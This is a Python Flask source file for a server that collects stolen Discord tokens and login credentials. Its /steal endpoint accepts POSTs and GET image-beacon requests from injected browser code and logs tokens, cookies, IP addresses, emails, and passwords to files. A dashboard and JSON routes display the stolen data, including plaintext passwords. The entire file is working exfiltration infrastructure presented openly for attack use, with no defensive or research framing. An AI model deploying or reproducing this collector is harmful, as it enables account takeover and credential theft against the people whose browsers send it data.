from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import json
import os
from datetime import datetime
import threading
import queue

app = Flask(__name__)
CORS(app)  # Allow cross-origin requests

# Storage
TOKENS_FILE = 'stolen_tokens.txt'
CREDS_FILE = 'stolen_creds.txt'
LOG_FILE = 'access.log'

# Queue for async processing
log_queue = queue.Queue()

# Ensure files exist
for f in [TOKENS_FILE, CREDS_FILE, LOG_FILE]:
    if not os.path.exists(f):
        open(f, 'w').close()

def log_to_file(filename, data):
    """Thread-safe logging"""
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(f"{datetime.now().isoformat()} | {json.dumps(data)}\n")
        f.flush()

@app.route('/steal', methods=['GET', 'POST'])
def steal():
    """Main endpoint to receive stolen tokens and credentials"""
    if request.method == 'POST':
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data'}), 400

        # Log what we received
        print(f"[RECEIVED] {json.dumps(data, indent=2)}")

        # Check if it's a token or credentials
        if 'token' in data:
            token = data['token']
            # Validate it's a Discord token (basic check)
            if token and len(token) > 30:
                log_to_file(TOKENS_FILE, {
                    'type': 'token',
                    'token': token,
                    'userAgent': data.get('userAgent', 'unknown'),
                    'url': data.get('url', 'unknown'),
                    'referrer': data.get('referrer', 'unknown'),
                    'cookies': data.get('cookies', ''),
                    'timestamp': data.get('timestamp', datetime.now().isoformat())
                })
                print(f"[TOKEN] Stored: {token[:20]}...")
            else:
                print(f"[TOKEN] Invalid or too short: {token}")

        if 'email' in data and 'password' in data:
            log_to_file(CREDS_FILE, {
                'type': 'credentials',
                'email': data['email'],
                'password': data['password'],
                'timestamp': data.get('timestamp', datetime.now().isoformat())
            })
            print(f"[CREDS] Stored: {data['email']}:{data['password']}")

        # Log access
        log_to_file(LOG_FILE, {
            'ip': request.remote_addr,
            'method': request.method,
            'data': data,
            'headers': dict(request.headers)
        })

        return jsonify({'status': 'ok'}), 200

    # GET method (for image beacon fallback)
    elif request.method == 'GET':
        token = request.args.get('token')
        if token:
            log_to_file(TOKENS_FILE, {
                'type': 'token',
                'token': token,
                'method': 'GET_beacon',
                'timestamp': datetime.now().isoformat()
            })
            print(f"[TOKEN] Received via GET: {token[:20]}...")
        return 'OK', 200

@app.route('/tokens', methods=['GET'])
def view_tokens():
    """View all stolen tokens (for debugging)"""
    if not os.path.exists(TOKENS_FILE):
        return jsonify([])
    with open(TOKENS_FILE, 'r') as f:
        lines = f.readlines()
    tokens = []
    for line in lines:
        try:
            # Parse the JSON part after the timestamp
            parts = line.split(' | ')
            if len(parts) == 2:
                data = json.loads(parts[1].strip())
                tokens.append(data)
        except:
            continue
    return jsonify(tokens)

@app.route('/creds', methods=['GET'])
def view_creds():
    """View all stolen credentials"""
    if not os.path.exists(CREDS_FILE):
        return jsonify([])
    with open(CREDS_FILE, 'r') as f:
        lines = f.readlines()
    creds = []
    for line in lines:
        try:
            parts = line.split(' | ')
            if len(parts) == 2:
                data = json.loads(parts[1].strip())
                creds.append(data)
        except:
            continue
    return jsonify(creds)

@app.route('/dashboard', methods=['GET'])
def dashboard():
    """Simple web dashboard to view stolen data"""
    tokens = []
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'r') as f:
            for line in f:
                try:
                    parts = line.split(' | ')
                    if len(parts) == 2:
                        data = json.loads(parts[1].strip())
                        tokens.append(data)
                except:
                    continue

    creds = []
    if os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, 'r') as f:
            for line in f:
                try:
                    parts = line.split(' | ')
                    if len(parts) == 2:
                        data = json.loads(parts[1].strip())
                        creds.append(data)
                except:
                    continue

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Token Dashboard</title>
        <style>
            body { font-family: monospace; background: #1e1f22; color: #fff; padding: 20px; }
            h1 { color: #5865f2; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th { background: #2b2d31; text-align: left; padding: 10px; border: 1px solid #3f4147; }
            td { padding: 8px; border: 1px solid #3f4147; word-break: break-all; }
            .token { color: #57f287; font-size: 12px; }
            .creds { color: #f23f42; }
            .section { margin-bottom: 40px; }
        </style>
    </head>
    <body>
        <h1>🎯 Token Dashboard</h1>
        <p>Last updated: {{ now }}</p>

        <div class="section">
            <h2>🔑 Stolen Tokens ({{ tokens|length }})</h2>
            <table>
                <tr><th>#</th><th>Token</th><th>User Agent</th><th>Timestamp</th></tr>
                {% for t in tokens %}
                <tr>
                    <td>{{ loop.index }}</td>
                    <td class="token">{{ t.token[:30] }}...</td>
                    <td>{{ t.userAgent[:50] if t.userAgent else 'N/A' }}</td>
                    <td>{{ t.timestamp[:19] if t.timestamp else 'N/A' }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <div class="section">
            <h2>👤 Stolen Credentials ({{ creds|length }})</h2>
            <table>
                <tr><th>#</th><th>Email</th><th>Password</th><th>Timestamp</th></tr>
                {% for c in creds %}
                <tr>
                    <td>{{ loop.index }}</td>
                    <td>{{ c.email }}</td>
                    <td class="creds">{{ c.password }}</td>
                    <td>{{ c.timestamp[:19] if c.timestamp else 'N/A' }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <p><a href="/tokens" style="color:#5865f2;">JSON Tokens</a> | <a href="/creds" style="color:#5865f2;">JSON Creds</a></p>
    </body>
    </html>
    """
    from jinja2 import Template
    template = Template(html)
    return template.render(tokens=tokens, creds=creds, now=datetime.now().isoformat())

@app.route('/clear', methods=['POST'])
def clear_data():
    """Clear all stolen data"""
    for f in [TOKENS_FILE, CREDS_FILE]:
        open(f, 'w').close()
    return jsonify({'status': 'cleared'})

if __name__ == '__main__':
    print("="*50)
    print("TOKEN COLLECTOR SERVER")
    print("="*50)
    print(f"Dashboard: http://localhost:5000/dashboard")
    print(f"Token endpoint: http://localhost:5000/steal")
    print("="*50)
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
